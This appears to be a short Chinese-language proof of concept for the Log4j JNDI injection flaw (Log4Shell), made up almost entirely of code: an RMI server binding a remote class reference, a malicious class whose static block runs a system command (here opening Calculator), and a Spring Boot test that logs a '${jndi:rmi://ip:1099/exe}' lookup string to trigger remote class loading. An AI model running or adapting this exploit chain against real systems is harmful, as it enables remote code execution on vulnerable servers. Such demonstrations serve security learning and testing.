> 创建RMI服务
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        System.out.println("create RMI registry on port 1099");
        Reference reference = new Reference("com.grapefruit.springboot.mysql.exe", "com.grapefruit.springboot" +
                ".mysql.exe", "");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("exe", referenceWrapper);
    }
}
```
```java
package com.grapefruit.springboot.mysql;
// 创建恶意代码
public class exe {
    static {
        System.err.println("Pwned");
        try {
            // 执行mac开启计算器命令
            String cmds = "open -a Calculator";
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
```

> 创建web服务(使用log4j)
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
    <version>2.3.2.RELEASE</version>
</dependency>
```
```java
@Slf4j
@SpringBootTest
class SpringbootApplicationTests {
    @Test
    void contextLoads() {
          System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
          log.error("error:{}","${jndi:rmi://ip:1099/exe}");
    }
}
```





